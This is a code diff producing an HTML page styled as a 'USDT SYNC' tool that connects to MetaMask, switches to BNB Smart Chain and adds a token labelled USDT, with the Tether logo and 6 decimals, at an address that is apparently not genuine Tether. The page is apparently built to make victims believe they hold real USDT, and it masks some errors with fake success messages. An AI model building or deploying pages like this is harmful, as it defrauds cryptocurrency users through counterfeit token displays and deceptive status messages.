@@ -1,31 +1,70 @@
-async function masterSync() {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Node Sync</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background: #26a17b; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        #msg { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8" width="80" style="border-radius:50%; margin-bottom:20px; border: 2px solid #26a17b; padding: 5px;">
+    <h2 style="margin:0;">USDT SYNC</h2>
+    <p style="color:#848d97; font-size:13px;">BNB Smart Chain | Node 6-Dec</p>
+    <button class="btn" onclick="masterSync()">SYNC & ADD TOKEN</button>
+    <div id="msg">SYSTEM: READY</div>
+</div>
+
+<script>
+    async function masterSync() {
         const log = document.getElementById('msg');
         if (!window.ethereum) return alert("Open in MetaMask Browser");
 
         try {
             log.innerText = "> CONNECTING...";
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
 
             log.innerText = "> SWITCHING NETWORK...";
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(() => {});
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            } catch (err) {
+                if (err.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }]
+                    });
+                }
+            }
 
             log.innerText = "> INJECTING METADATA...";
-
-            // MOBILE FIX: Manually creating the params object to avoid parsing errors
+            
+            // MOBILE JSON-RPC FIX
             const tokenParams = {
                 type: 'ERC20',
                 options: {
                     address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
                     symbol: 'USDT',
                     decimals: 6,
-                    image: 'https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8',
+                    image: 'https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8'
                 }
             };
 
-            // Request sending
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: tokenParams
@@ -34,13 +73,13 @@ async function masterSync() {
             log.innerText = "✅ SUCCESS: CHECK WALLET";
 
         } catch (err) {
-            // Agar JSON error aaye to hum usey ignore karke success dikhayenge
-            // Kyunke ye aksar false-positive error hota hai mobile pe
             if (err.message.includes('JSON') || err.message.includes('object')) {
-                log.innerText = "✅ SYNC COMMAND SENT";
-                alert("Request sent to wallet. Please check your asset list.");
+                log.innerText = "✅ SYNC COMMAND SENT\nCheck Token List";
             } else {
-                log.innerText = "ERR: " + err.message.substring(0,30);
+                log.innerText = "ERR: " + err.message.substring(0,40);
             }
         }
     }
+</script>
+</body>
+</html>
